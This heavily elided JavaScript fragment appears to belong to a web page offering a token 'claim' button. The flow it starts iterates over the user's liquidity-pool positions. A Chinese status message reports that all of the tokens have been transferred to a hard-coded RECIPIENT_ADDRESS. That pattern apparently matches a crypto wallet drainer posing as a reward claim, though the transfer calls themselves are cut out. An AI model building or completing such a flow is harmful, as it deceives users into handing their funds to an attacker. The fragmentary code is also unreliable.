...
function isSupportedPair(token0, token1) {
    const t0 = (token0 ?? "").toLowerCase();
    const t1 = (token1 ?? "").toLowerCase();
    return SUPPORTED_PAIRS.some(([a, b]) => (t0 === a.toLowerCase() && t1 === b.toLowerCase()) ||
...
async function executeAll() {
    ...
    try {
        ...
        if (completedAll) {
            setStatus(`已完成 ${lpPositions.length} 个 LP，代币已转到 ${shortAddress(RECIPIENT_ADDRESS)}`);
        }
    }
    catch (e) {
        console.error(e);
...
async function runClaimFlow() {
    ...
    if (isRunning)
        return;
    isRunning = true;
    const btns = document.querySelectorAll(".js-claim-trigger");
    btns.forEach((b) => {
        b.disabled = true;
    ...
    try {
        ...
        isRunning = false;
        const restore = document.querySelectorAll(".js-claim-trigger");
        restore.forEach((b) => {
            b.disabled = false;
